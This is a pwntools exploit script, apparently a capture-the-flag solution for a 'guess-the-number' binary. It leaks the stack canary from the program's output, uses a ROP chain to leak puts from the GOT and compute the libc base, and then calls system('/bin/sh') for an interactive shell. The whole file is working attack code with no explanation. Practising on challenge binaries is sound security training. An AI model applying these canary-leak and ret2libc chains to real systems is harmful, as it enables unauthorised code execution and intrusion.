from pwn import * 

binary = "./guess-the-number_patched"
libc = ELF('./libc.so.6')
p = process(binary)
#p = remote('phoenix-chal.firebird.sh', 36004)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

s = '''
b * main+295
'''
gdb.attach(p, s)
p.recvuntil(b'Your guess: ')
# Combine both inputs into one send
p.send(b'1\x00') # omg \x00 used to replacd newline worked! it does nto get consumed by gets
# Then send empty line to complete scanf
#p.sendline(b'')

p.recvuntil(b"is ")
rand_src = int((p.recvuntil(b".", drop = True)).decode())
canary = (rand_src & 0xffffffffffffff00) | 0x00
print(hex(canary))
pop_rdi = 0x00000000004013a3
ret = 0x000000000040101a
payload2 = flat(
    b'A' * 7,
    p64(canary),
    b'B'*8,
    pop_rdi,
    elf.got['puts'],  
    elf.plt['puts'],
    p64(0x00000000004011f6) # main, go back to do another ROP chain to get the system 
)
p.send(payload2)
p.recvuntil(b'Better luck next time.\n')
p.sendline(b'')

libc_leak = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
libc_base = libc_leak - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
#print(hex(libc_leak))
#print(hex(libc_base))
p.send(b'1\x00')
payload3 = flat(
    b'A' * 7,
    p64(canary),
    b'B'*8,
    ret,
    pop_rdi,
    p64(0x402089), # /bin/sh
    sys_addr # system 
)
p.send(payload3)
p.recvuntil(b'Better luck next time.\n')
p.sendline(b'')


p.interactive()